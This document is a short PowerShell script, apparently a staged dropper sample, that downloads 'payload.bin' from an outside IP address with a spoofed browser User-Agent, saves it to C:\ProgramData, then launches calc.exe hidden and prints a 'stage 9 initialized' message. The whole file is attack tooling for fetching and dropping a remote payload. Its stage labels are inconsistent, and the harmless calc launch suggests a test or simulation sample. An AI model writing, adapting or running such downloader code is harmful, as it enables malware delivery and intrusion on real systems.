
$Stage1Url = "https://198.51.100.248/downloads/payload.bin"
$DropPath = 'C:\ProgramData\payload.bin'
$RequestTimeout = 18
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-Stage2Download -SourceUrl $Stage1Url -DestinationPath $DropPath -TimeoutSec $RequestTimeout -UserAgent $UserAgent
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Write-Output "stage 9 initialized"
Start-Sleep -Seconds 5
